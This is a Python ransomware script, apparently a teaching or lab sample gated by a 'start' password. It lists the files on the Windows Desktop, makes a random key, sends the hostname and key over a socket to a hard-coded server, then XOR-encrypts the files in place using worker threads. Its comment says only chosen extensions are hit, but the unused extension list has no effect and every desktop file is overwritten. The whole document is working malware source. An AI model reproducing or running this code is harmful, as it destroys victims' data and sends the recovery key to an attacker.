import socket
import os
import threading
import queue
import random

safeguard = input("Please enter the safeguard password: ")
if safeguard != 'start':
    quit()


class ec:
    # File exstensions to seek out and Encrypt
    file_exts = [
        'txt',
        # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
        # -and leaves other files un-ecnrypted etc.
        # 'png',

    ]


# encryption function that threads will run
def encrypt(key):
    while True:
        file = q.get()
        print(f'Encrypting {file}')
        try:
            key_index = 0
            max_key_index = len(key) - 1
            encrypted_data = ''
            with open(file, 'rb') as f:
                data = f.read()
            with open(file, 'w') as f:
                f.write('')
            for byte in data:
                xor_byte = byte ^ ord(key[key_index])
                with open(file, 'ab') as f:
                    f.write(xor_byte.to_bytes(1, 'little'))
                # increment key index
                if key_index >= max_key_index:
                    key_index = 0
                else:
                    key_index += 1
        except:
            print('failed to encrypt file :C')
        q.task_done()


# socket information
IP_ADDRESS = '10.6.196.206'
PORT = 5678

# Encryption information
encryption_level = 512 // 8  # 512 bit encryption = 64 bytes
key_char_pool = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./;[]{}|'
key_char_pool_len = len(key_char_pool)

# grab filepaths to encrypt
print("Preparing files...")
desktop_path = os.environ['USERPROFILE'] + '\\Desktop'
files = os.listdir(desktop_path)
abs_files = []
for f in files:
    if os.path.isfile(f'{desktop_path}\\{f}') and f != __file__[:-2] + 'exe':
        abs_files.append(f'{desktop_path}\\{f}')

# grab clients hostname
hostname = os.getenv('COMPUTERNAME')

# generate encryption key
print("Generating encryption key...")
key = ''
for i in range(encryption_level):
    key += key_char_pool[random.randint(0, key_char_pool_len - 1)]
print("Key generated!!!")

# connect to server to transfer key and hostname
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((IP_ADDRESS, PORT))
    print('Successfully connected... transmitting hostname and key')
    s.send(f'{hostname} : {key}'.encode('utf-8'))
    print('Finished transmitting data')
    s.close()

# store files into a queue for threads to handle
q = queue.Queue()
for f in abs_files:
    q.put(f)

# setup threads to get ready for encryption
for i in range(10):
    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
    t.start()

q.join()
print('Encryption and upload complete!!! :)')
input()
